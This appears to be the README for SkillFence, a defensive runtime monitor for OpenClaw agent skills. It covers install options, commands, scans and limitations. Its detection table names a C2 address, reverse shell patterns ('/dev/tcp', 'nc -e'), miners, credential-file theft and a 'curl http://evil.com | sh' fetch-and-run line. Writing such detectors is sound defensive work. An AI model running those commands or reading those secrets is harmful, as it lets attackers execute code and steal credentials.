# 🛡️ SkillFence — Runtime Skill Monitor for OpenClaw

**Watch what your skills actually do. Not what they claim to do.**

Scanners check code before install. SkillFence watches what code does after install. Network calls, file access, credential reads, process activity — all monitored and logged.

## The Problem

341 malicious skills were found on ClawHub (ClawHavoc campaign). Pre-install scanners caught them after the fact. But the Polymarket backdoor? It looked clean. The malicious `curl` was buried in a working market search function — it only triggered during normal use. No scanner would have caught it before it fired.

**Nobody is watching what skills do at runtime. SkillFence does.**

## What It Catches

| Threat | How | Example |
|--------|-----|---------|
| Known C2 servers | IP/domain matching | ClawHavoc's `54.91.154.110:13338` |
| Reverse shells | Process monitoring | `/dev/tcp` connections, `nc -e` |
| Crypto miners | Process monitoring | xmrig, cpuminer processes |
| curl\|sh attacks | Pattern matching | `curl http://evil.com \| sh` |
| Credential theft | File access monitoring | Reading `.env`, `openclaw.json`, SSH keys |
| Data exfiltration | Combined analysis | Network calls + sensitive file reads |
| Encoded payloads | Base64 detection | Obfuscated commands with decode ops |

## Install (30 seconds)

### Option 1: ClawHub (recommended)

```bash
clawhub install skillfence
```

### Option 2: Manual

```bash
cd ~/clawd/skills   # or ~/.openclaw/skills
git clone https://github.com/deeqyaqub1-cmd/skillfence-openclaw skillfence
```

### Option 3: Copy-paste

Create `~/clawd/skills/skillfence/` and copy `SKILL.md` + `monitor.js` into it.

**No dependencies. No API keys. No config. Just Node.js.**

## Commands

```
/skillfence              → Session status
/skillfence scan         → Full system scan (skills + network + processes + credentials)
/skillfence scan <skill> → Scan a specific skill before installing
/skillfence watch        → Quick runtime check
/skillfence log          → View audit trail
```

## Full System Scan

Ask your OpenClaw: *"Run a security scan"*

SkillFence checks:
1. **All installed skills** — known C2 addresses, dangerous commands, credential access, data exfiltration patterns, encoded payloads
2. **Active network connections** — connections to known malicious servers, unusual ports on raw IPs
3. **Running processes** — reverse shells, crypto miners, remote code execution
4. **Sensitive file access** — recently accessed credentials, configs, keys, wallets

Results come with severity ratings:
- 🔴 **CRITICAL** — Known C2, active reverse shells, crypto miners. Act immediately.
- 🟠 **HIGH** — Data exfiltration, dangerous commands, credential access. Investigate now.
- 🟡 **MEDIUM** — Unusual connections, encoded payloads, recent credential reads. Review soon.
- 🟢 **CLEAN** — No issues found.

## Pre-Install Check

Before installing any new skill:

> "Check if the weather skill is safe"

SkillFence scans the skill's files and returns a verdict: DANGEROUS / SUSPICIOUS / REVIEW / CLEAN.

## Security

- **Read-only** — SkillFence monitors and reports. It never modifies, deletes, or executes anything. Credential checks only read file metadata (timestamps), never file contents.
- **No data leaves your machine** — all scanning happens locally. This skill never makes outbound network requests.
- **No API keys required** — works entirely offline
- **Open source** — read every line before you install
- **Audit trail** — every scan, alert, and block is logged with timestamps

## Honest Limitations

SkillFence runs as a skill at the same privilege level as other skills. This means:

- A sophisticated attacker could potentially detect and evade it
- Raw socket connections may bypass detection
- Novel attack techniques not in our pattern database won't be caught
- It's a **security camera, not a locked door**

But most attacks are unsophisticated. The entire ClawHavoc campaign used basic `curl`, `os.system`, and base64 chains. SkillFence catches all of that. Detection and deterrence beat zero monitoring.

## Pro ($9/mo)

Free tier includes all monitoring features, unlimited scans.

[SkillFence Pro](https://cascadeai.dev/skillfence) is a separate web dashboard that unlocks:

- 📊 Persistent threat dashboard across sessions
- 📧 Weekly security digest reports
- 🔧 Custom threat rules (add your own patterns)
- 🧩 Priority threat intelligence updates

**Pro features run on the CascadeAI web dashboard, not inside this skill.**

## Verify It Works

After installing, ask your OpenClaw:

> "Run a security scan on my skills"

If you see `🛡️ SkillFence | X skills scanned | 🟢 ALL CLEAR` — you're protected.

---

**Built for the OpenClaw community. Know what your skills are doing.**

[GitHub](https://github.com/deeqyaqub1-cmd/skillfence-openclaw) · [ClawHub](https://clawhub.com/deeqyaqub1-cmd/skillfence) · [Pro](https://cascadeai.dev/skillfence) · [Discord](https://discord.gg/cascadeai)
